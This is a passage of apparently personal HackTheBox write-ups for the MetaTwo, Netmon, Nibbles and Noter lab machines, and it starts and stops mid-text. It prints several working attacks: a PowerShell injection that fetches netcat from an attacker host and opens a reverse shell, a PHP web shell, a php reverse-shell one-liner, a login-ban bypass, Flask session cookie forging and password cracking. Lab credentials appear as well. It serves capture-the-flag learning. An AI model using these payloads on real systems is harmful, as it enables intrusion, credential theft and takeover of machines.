snippets/fastcgi-php.conf;\n        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;\n    }\n\n    location ~* \\.(js|css|png|jpg|jpeg|gif|ico|svg)$ {\n        expires max;\n        log_not_found off;\n    }\n\n}\n</code></pre> <p>Now it is easy to find the Wordpress configuration file <code>/var/www/metapress.htb/blog/wp-config.php</code></p> <pre><code>&lt;?php\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'blog' );\n\n/** MySQL database username */\ndefine( 'DB_USER', 'blog' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8mb4' );\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n\ndefine( 'FS_METHOD', 'ftpext' );\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\ndefine( 'FTP_HOST', 'ftp.metapress.htb' );\ndefine( 'FTP_BASE', 'blog/' );\ndefine( 'FTP_SSL', false );\n\n/**#@+\n * Authentication Unique Keys and Salts.\n * @since 2.6.0\n */\ndefine( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:' );\ndefine( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );\ndefine( 'LOGGED_IN_KEY',    'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy' );\ndefine( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );\ndefine( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D' );\ndefine( 'SECURE_AUTH_SALT', '&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.' );\ndefine( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=' );\ndefine( 'NONCE_SALT',       '.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );\n\n/**\n * WordPress Database Table prefix.\n */\n$table_prefix = 'wp_';\n\n/**\n * For developers: WordPress debugging mode.\n * @link https://wordpress.org/support/article/debugging-in-wordpress/\n */\ndefine( 'WP_DEBUG', false );\n\n/** Absolute path to the WordPress directory. */\nif ( ! defined( 'ABSPATH' ) ) {\n    define( 'ABSPATH', __DIR__ . '/' );\n}\n\n/** Sets up WordPress vars and included files. */\nrequire_once ABSPATH . 'wp-settings.php';\n</code></pre> <p>Some interesting things here, credentials for the database: <code>blog:635Aq@TdqrCwXFUZ</code> and credentials for the FTP server: <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code>. Now we can finally access the FTP server and start preparing a way into the machine.</p>"},{"location":"HackTheBox/MetaTwo/#port-21","title":"Port 21","text":"<p>In the FTP server I can get access to all the Wordpress files but also to a directory called <code>mailer</code>. Looks like this is a PHP application that will be used to send messages to all the blog users, the interesting thing here is the file <code>send_email.php</code>. I found new credentials for what looks like a email server in port 587: <code>jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys</code>.</p> <p>I decided to try the credentials I just found to connect through SSH as the <code>jnelson</code> user and it worked! We are in the machine now!</p>"},{"location":"HackTheBox/MetaTwo/#inside-the-machine-as-jnelson","title":"Inside the machine as <code>jnelson</code>","text":"<p>After getting the flag I saw something interesting right away, a directory called <code>.passpie</code>. A quick Google search revealed that this folder is part of a password manager called Passpie. According with the <code>ssh</code> directory inside, looks like we could get the <code>root</code> password from here somehow:</p> <pre><code>jnelson@meta2:~/.passpie/ssh$ ls\njnelson.pass  root.pass\n</code></pre> <pre><code>jnelson@meta2:~$ passpie \n\u2552\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2564\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2555\n\u2502 Name   \u2502 Login   \u2502 Password   \u2502 Comment   \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 ssh    \u2502 jnelson \u2502 ********   \u2502           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 ssh    \u2502 root    \u2502 ********   \u2502           \u2502\n\u2558\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255b\n</code></pre>"},{"location":"HackTheBox/MetaTwo/#privilege-escalation","title":"Privilege escalation","text":"<p>Researching the documentation a bit, looks like it is possible to get the password using a master key. I found something interesting:</p> <pre><code>jnelson@meta2:~/.passpie$ ls -la\ntotal 24\ndr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .\ndrwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 ..\n-r-xr-x--- 1 jnelson jnelson    3 Jun 26 13:57 .config\n-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .keys\ndr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh\n</code></pre> <p>That <code>.key</code> file contains both a private and a public PGP keys. Checking how this password manager works, looks like the private key is encrypted using a master password and then the passwords stored are encrypted using the public key. In order to decrypt the stored passwords, the user needs to enter the master password to decrypt the private key that allows the decryption of the information encrypted with the public key.</p> <p>I copied the private key from the <code>.keys</code> file and using <code>gpg2john</code> and transfomed it into a hash that JohnTheRipper can understand. I just had to use the RockYou dictionary to get the master password <code>blink182</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/MetaTwo(TODO)/passpie]\n\u2514\u2500$ john --wordlist=/home/kali/Wordlists/rockyou.txt hash                                             \nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 65011712 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nblink182         (Passpie)     \n1g 0:00:00:01 DONE (2022-10-31 18:36) 0.5617g/s 94.38p/s 94.38c/s 94.38C/s ginger..987654\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>Now we can just get the <code>root</code> passowrd and get the flag!</p> <pre><code>jnelson@meta2:~$ passpie copy root@ssh --to stdout\nPassphrase: \np7qfAZt4_A1xo_0x\n</code></pre>"},{"location":"HackTheBox/Netmon/","title":"Netmon","text":""},{"location":"HackTheBox/Netmon/#nmap","title":"Nmap","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -v -p- --min-rate 1000 &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 20:36 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.051s latency).\nNot shown: 65522 closed ports\nPORT      STATE SERVICE\n21/tcp    open  ftp\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n5985/tcp  open  wsman\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 43.70 seconds\n           Raw packets sent: 65787 (2.895MB) | Rcvd: 65537 (2.622MB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 -sC -sV &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 20:41 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.051s latency).\n\nPORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 02-03-19  12:18AM                 1024 .rnd\n| 02-25-19  10:15PM       &lt;DIR&gt;          inetpub\n| 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs\n| 02-25-19  10:56PM       &lt;DIR&gt;          Program Files\n| 02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)\n| 02-03-19  08:08AM       &lt;DIR&gt;          Users\n|_02-25-19  11:49PM       &lt;DIR&gt;          Windows\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)\n|_http-server-header: PRTG/18.1.37.13946\n| http-title: Welcome | PRTG Network Monitor (NETMON)\n|_Requested resource was /index.htm\n|_http-trane-info: Problem with XML parsing of /evox/about\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1s, deviation: 0s, median: 0s\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-09-25T00:42:04\n|_  start_date: 2021-09-25T00:34:22\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.46 seconds\n</code></pre> <p>Ok those are a lot of ports, let's start for the promising ones. Even though the FTP server allows anonymous access to the root volume I want to check the web server first.</p>"},{"location":"HackTheBox/Netmon/#port-80","title":"Port 80","text":"<p>Looks like a network monitor thing with a login page. The service is called PRTG Network Monitor and the installed version is 18.1.37.13946. I found a RCE exploit for it in <code>searchsploit</code> but we need the admin credentials for it. </p> <p>Lets use the FTP server to take a look and see if we can get what we need.</p>"},{"location":"HackTheBox/Netmon/#port-21","title":"Port 21","text":"<p>After looking around, I found this in the <code>/ProgramData/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak</code> file:</p> <pre><code>&lt;dbpassword&gt;\n  &lt;!-- User: prtgadmin --&gt;\n  PrTg@dmin2018\n &lt;/dbpassword&gt;\n</code></pre> <p>This credentials didn't worked but since this was an old file... maybe chaning the date... like... <code>prtgadmin:PrTg@dmin2019</code>? Well actually worked!</p> <p>Once we have access as admin to the panel, maybe we can exploit this somehow. After searching a bit, I found something that can lead to a reverse shell.</p>"},{"location":"HackTheBox/Netmon/#foothold-and-system","title":"Foothold and system","text":"<p>First, we can go to Setup / Account Settings / My Account / Notifications and then add a new alarm. Then, we have to search for the 'Execute Program' option and select the PowerShell notifications demo script.</p> <p>In the application version used by the machine, this demo script is vulnerable to command injection. In the parameter field we have to put this:</p> <pre><code>test.txt; powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://&lt;ATACKER_IP&gt;:8000/nc64.exe','C:\\Users\\Public\\nc64.exe'); C:\\Users\\Public\\nc64.exe -e C:\\Windows\\System32\\cmd.exe &lt;ATACKER_IP&gt; 8080\"\n</code></pre> <p>Now we can save the changes, check this new notification and click the option to send it. After doing that, while having a listener and hosting a web server with a compatible <code>netcat</code> binary for the victim machine, we would get a reverse shell!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [&lt;ATACKER_IP&gt;] from (UNKNOWN) [&lt;MACHINE_IP&gt;] 50677\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>And we are already <code>system</code>! We can get the flag under <code>C:\\Users\\Administrator\\Desktop\\root.txt</code></p>"},{"location":"HackTheBox/Nibbles/","title":"Nibbles","text":""},{"location":"HackTheBox/Nibbles/#nmap-scan","title":"Nmap scan","text":"<p><pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1000 -p- 10.10.10.75\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 12:48 EST\nNmap scan report for 10.10.10.75\nHost is up (0.051s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 17.93 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p80,22 10.10.10.75    \nStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 12:49 EST\nNmap scan report for 10.10.10.75\nHost is up (0.051s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.72 seconds\n</code></pre></p> <p>A website and SSH, let's start with the port 80 and check what we can get from it.</p>"},{"location":"HackTheBox/Nibbles/#port-80","title":"Port 80","text":"<p>The site only contains a 'Hello world' message but inspecting the code we can see a code comment: <pre><code> &lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;\n</code></pre> Visiting <code>/nibbleblog/</code> will reveal a blog, let's enumerate it.</p>"},{"location":"HackTheBox/Nibbles/#nibbleblog","title":"Nibbleblog","text":"<p>Nibbleblog is an engine for blog creation. Using Gobuster: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.75/nibbleblog/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php\n[+] Timeout:                 10s\n===============================================================\n2021/12/04 12:58:04 Starting gobuster in directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 2987]\n/sitemap.php          (Status: 200) [Size: 402] \n/content              (Status: 301) [Size: 323] [--&gt; http://10.10.10.75/nibbleblog/content/]\n/themes               (Status: 301) [Size: 322] [--&gt; http://10.10.10.75/nibbleblog/themes/] \n/feed.php             (Status: 200) [Size: 302]                                             \n/admin                (Status: 301) [Size: 321] [--&gt; http://10.10.10.75/nibbleblog/admin/]  \n/admin.php            (Status: 200) [Size: 1401]                                            \n/plugins              (Status: 301) [Size: 323] [--&gt; http://10.10.10.75/nibbleblog/plugins/]\n/install.php          (Status: 200) [Size: 78]                                              \n/update.php           (Status: 200) [Size: 1622]                                            \n/README               (Status: 200) [Size: 4628]                                            \n/languages            (Status: 301) [Size: 325] [--&gt; http://10.10.10.75/nibbleblog/languages/]       \n===============================================================\n2021/12/04 13:03:24 Finished\n===============================================================\n</code></pre> We can see some interesting things, checking the <code>README</code> file reveals the version of the site: <code>4.0.3</code>. Let's see if something exists for this version: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ searchsploit Nibbleblog  \n----------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                     |  Path\n----------------------------------------------------------------------------------- ---------------------------------\nNibbleblog 3 - Multiple SQL Injections                                             | php/webapps/35865.txt\nNibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                              | php/remote/38489.rb\n----------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> The second one sounds cool but needs an authenticated user so time to move on. </p> <p>We can try to brute force the <code>/admin.php</code> page. To help with this, the file <code>/nibbleblog/content/private/users.xml</code> contains the users registered in the application which, in this case, only contains the <code>admin</code> user. This file also reveals something not good, looks like the application is blocking IPs out after a number of failed logins (Checking the application code shows that the ban is 5 minutes long after 5 unsuccessful logins).</p> <p>I decided to change the <code>X-Forwarded-For</code> header to see if the block can be bypassed and... actually it worked! So time for Python and a custom brute force tool... or not. The password was <code>nibbles</code> and yes, my Python code found the password, but I should have tried a bit harder with the default credentials becasue it would have been faster, lesson learnt. The Python code I wrote is uploaded as a resource if someone wants to check it out.</p> <p>Now we can continue with the exploit we found earlier and get access to the box.</p>"},{"location":"HackTheBox/Nibbles/#rce","title":"RCE","text":"<p>Checking the Metasploit exploit found by <code>searchsploit</code> it is easy where to look for our foothold. There is a plugin called \"My image\" that lets you upload images to the site, the thing is that it is not checking the files so a web shell can be used instead. The uploaded files are located at <code>/nibbleblog/content/private/plugins/my_image/</code>.</p> <p>I uploaded a simple PHP web shell to get code execution: <pre><code>&lt;?php\n    if (isset($_GET['cmd'])) {\n        system($_GET['cmd']);\n    }\n?&gt;\n</code></pre> And then spinning up a listener and with a reverse shell like this (Remember to URL encode it!): <pre><code>php -r '$sock=fsockopen(\"10.10.14.26\",8080);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre> We get access to the machine! <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080 \nlistening on [any] 8080 ...\nconnect to [10.10.14.26] from (UNKNOWN) [10.10.10.75] 52934\n/bin/sh: 0: can't access tty; job control turned off\n$\n</code></pre> The user flag is under <code>/home/nibbler/user.txt</code>.</p>"},{"location":"HackTheBox/Nibbles/#privilege-escalation","title":"Privilege escalation","text":"<p>Right now we have access as the <code>nibbler</code> user. In its <code>home</code> directory we can find a <code>personal.zip</code> file that contains a monitoring script and if we check if we can use <code>sudo</code>: <pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l\nMatching Defaults entries for nibbler on Nibbles:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n</code></pre></p> <p>There it is our attack vector. Since we have control over that script route we can just change the contents of the <code>monitor.sh</code> script with: <pre><code>#! /bin/bash\nbash\n</code></pre></p> <p>Executing our new script with <code>sudo</code> will give us a <code>root</code> shell: <pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh\nroot@Nibbles:/home/nibbler/personal/stuff#\n</code></pre> The <code>root</code> flag is under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Noter/","title":"Noter","text":""},{"location":"HackTheBox/Noter/#nmap-scan","title":"Nmap scan","text":"<p>Let's start with a typical all ports scan and then get a more detailed scan for every open port open:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 10.10.11.160\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 05:32 EDT\nNmap scan report for 10.10.11.160\nHost is up (0.055s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n5000/tcp open  upnp\n\nNmap done: 1 IP address (1 host up) scanned in 19.24 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p21,22,5000 -sC -sV 10.10.11.160\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 05:34 EDT\nNmap scan report for 10.10.11.160\nHost is up (0.051s latency).\n\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)\n|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)\n|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)\n5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)\n|_http-title: Noter\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.59 seconds\n</code></pre> <p>So we have FTP, SSH and a webpage in port 5000. Since both FTP and SSH require credentials we don't have let's start with the port 5000.</p>"},{"location":"HackTheBox/Noter/#web-application","title":"Web application","text":""},{"location":"HackTheBox/Noter/#looking-around","title":"Looking around","text":"<p>The web application let the user create notes. After testing some basic SQL injection payloads in the login form I decided to just register and start using the app to see how it works and I noticed something. After creating a note a clicking in the edit button the URL is like this: <pre><code>http://10.10.11.160:5000/edit_note/3\n</code></pre> This could suggest an IDOR vulnerability but no luck with the fuzzzing, also tried some XSS or SSTI and I got something this time.</p> <p>Looks like the form is URL encoding the message sent to the server and indicating the data type: <code>application/x-www-form-urlencoded</code> but the server is not really checking that the data is actually URL encoded so using Burb suite it is possible to send data without encoding. Something like: <pre><code>&lt;h1&gt;hello&lt;/h1&gt;hellohellohellohellohellohellohello\n</code></pre></p> <p>Is generating this note: <pre><code>    # hello\n\nhellohellohellohellohellohellohello\n</code></pre></p> <p>Looks like it is translating things to Markdown? Anyway, I guess this could lead to some kind of XSS but since the cookie is <code>HttpOnly</code> this won't really help.</p>"},{"location":"HackTheBox/Noter/#backend-tecnology-and-cookie-secret","title":"Backend tecnology and cookie secret","text":"<p>Looking at the header: <code>Werkzeug httpd 2.0.2 (Python 3.8.10)</code> this is probably a Flask server. Using a Flask session encoder/decoder: https://github.com/noraj/flask-session-cookie-manager I was able to confirm my guess:</p> <pre><code>\u250c\u2500\u2500(venv)\u2500(kali\u327fkali)-[~/Documents/HTB/Noter/flask-session-cookie-manager]\n\u2514\u2500$ python3 flask_session_cookie_manager3.py decode -c eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicmFwdG9yIn0.YpDXsA.rmBkWKEmp_Ona9WwTNCoMNn06lo\nb'{\"logged_in\":true,\"username\":\"raptor\"}'\n</code></pre> <p>We can try to brute force the secret key now. Searching a bit I found this tool: https://github.com/Paradoxis/Flask-Unsign, let's try it out using Rockyou as wordlist:</p> <p><pre><code>\u250c\u2500\u2500(venv)\u2500(kali\u327fkali)-[~/Documents/HTB/Noter]\n\u2514\u2500$ flask-unsign --unsign --cookie \"eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicmFwdG9yIn0.YpDXsA.rmBkWKEmp_Ona9WwTNCoMNn06lo\" --wordlist ~/Wordlists/rockyou.txt --no-literal-eval         \n[*] Session decodes to: {'logged_in': True, 'username': 'raptor'}\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 17024 attempts\nb'secret123'\n</code></pre> This is our lucky day! We can now forge cookies using the secret key <code>secret123</code> (Both of the above tools can do it). Only one thing, we don't really know about other users so I guess we need to figure that out next.</p>"},{"location":"HackTheBox/Noter/#enumerating-users","title":"Enumerating users","text":"<p>After a while I found something. Looks like the login page can be used to leak usernames already registered in the page, the error message is <code>Invalid credentials</code> if the user does not exists and <code>Invalid login</code> if the user exists but the password is wrong.</p> <p>Using Hydra to search for valid users I got that there is indeed another user registered in the page (I used a dummy password):</p> <pre><code>\u250c\u2500\u2500(venv)\u2500(kali\u327fkali)-[~/Documents/HTB/Noter]\n\u2514\u2500$ hydra -L /usr/share/wordlists/metasploit/namelist.txt -p 123 10.10.11.160 -s 5000 http-post-form \"/login:username=^USER^&amp;password=^PASS^:Invalid credentials\"   \nHydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-27 10:53:14\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 1909 login tries (l:1909/p:1), ~120 tries per task\n[DATA] attacking http-post-form://10.10.11.160:5000/login:username=^USER^&amp;password=^PASS^:Invalid credentials\n[5000][http-post-form] host: 10.10.11.160   login: blue   password: 123\n[5000][http-post-form] host: 10.10.11.160   login: raptor   password: 123\n[STATUS] 1572.00 tries/min, 1572 tries in 00:01h, 337 to do in 00:01h, 16 active\n1 of 1 target successfully completed, 2 valid passwords found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-27 10:54:27\n</code></pre>"},{"location":"HackTheBox/Noter/#forging-cookies","title":"Forging cookies","text":"<p>Since we found that <code>blue</code> is a valid user and also know the cookie secret we should be able to forge a new cookie to login as this user:</p> <pre><code>\u250c\u2500\u2500(venv)\u2500(kali\u327fkali)-[~/Documents/HTB/Noter]\n\u2514\u2500$ flask-unsign --sign --cookie \"{'logged_in':True,'username':'blue'}\" --secret 'secret123'\neyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YpDo4w.-__pw4id5OTjiaD9PgwafrOD6Y4\n</code></pre> <p>Replacing our session cookie for the generated one we are now logged in as <code>blue</code>! Looks like its a prenium user and can upload notes, this could be handy later. Also, it is possible to find another username: <code>ftp_admin</code> and <code>blue</code> credentials for the FTP server: <code>blue:blue@Noter!</code>. In the FTP server, I found a PDF file that explain that all the accounts password are generated following this schema: <code>username@site_name!</code> and that this default password should be changed.</p> <p>There is a reminder about changing the admin password in <code>blue</code> account so maybe the default password is still in place. I tried to login to the FTP service using <code>ftp_admin:ftp_admin@Noter!</code> as credentials and I got access as <code>ftp_admin</code>! There are backups of the application so time to analyze the code.</p>"},{"location":"HackTheBox/Noter/#rce","title":"RCE","text":"<p>The most recent app backup is the one that contains all the application endpoints we saw in the live app. After a while I found something interesting in the <code>/export_note_remote</code> endpoint:</p> <pre><code># Export remote\n@app.route('/export_note_remote', methods=['POST'])\n@is_logged_in\ndef export_note_remote():\n    if check_VIP(session['username']):\n        try:\n            url = request.form['url']\n\n            status, error = parse_url(url)\n\n            if (status is True) and (error is None):\n                try:\n                    r = pyrequest.get(url,allow_redirects=True)\n                    rand_int = random.randint(1,10000)\n                    command = f\"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}\"\n                    subprocess.run(command, shell=True, executable=\"/bin/bash\")\n\n                    ...\n</code></pre> <p>The application, when exporting a markdown file from the cloud, is not validating the data received at all. It just build a command for Bash that run a javascript program to convert a Markdown file to a PDF.</p> <p>If the Markdown file contains 